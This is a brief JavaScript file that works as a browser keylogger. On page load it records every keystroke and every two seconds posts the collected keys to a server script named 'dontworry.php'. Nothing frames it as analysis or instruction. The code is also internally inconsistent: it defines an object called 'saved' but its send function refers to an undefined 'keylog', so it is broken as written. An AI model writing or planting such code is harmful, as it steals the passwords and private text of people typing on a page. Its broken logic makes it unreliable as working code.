var saved = {
    // setting up
    cache : [], // storage for key presses
    delay : 2000, // delay for sending to server
    sending : false, // prevent parallel posts
  
    // initialization, on page load
    init : () => {
      // trying to capture key strokes
      window.addEventListener("keydown", (evt) => {
        saved.cache.push(evt.key);
      });
   
      // sending to server
      window.setInterval(saved.send, saved.delay);
    },
  
    // ajax sending event
    send : () => { if (!keylog.sending && keylog.cache.length != 0) {
      // true until sent
      keylog.sending = true;
   
      // saving data
      var data = new FormData();
      data.append("keys", JSON.stringify(keylog.cache));
      keylog.cache = []; // clearing data
  
      // fetching
      fetch("dontworry.php", { method:"POST", body:data })
      .then(res=>res.text()).then((res) => {
        saved.sending = false; // clearing bool for sending 
        console.log(res); // test
      })
      .catch((err) => { console.error(err); });
    }}
  };
  window.addEventListener("DOMContentLoaded", saved.init);
